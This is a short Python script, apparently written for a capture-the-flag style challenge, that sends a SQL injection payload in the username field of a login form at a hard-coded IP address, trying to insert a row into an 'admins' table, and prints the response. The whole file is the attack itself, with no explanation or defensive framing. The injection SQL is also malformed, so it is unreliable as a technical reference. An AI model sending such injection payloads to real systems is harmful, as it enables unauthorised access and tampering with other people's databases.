import requests
url = "http://34.94.3.143/816a0a9f74/login"
data = {"username": "' UNION INSERT INTO admins (username, password) VALUES (select 1 username FROM admins, select 1 password FROM admins) ;-- ", "password": ""}

request = requests.post(url, data).text

print(request)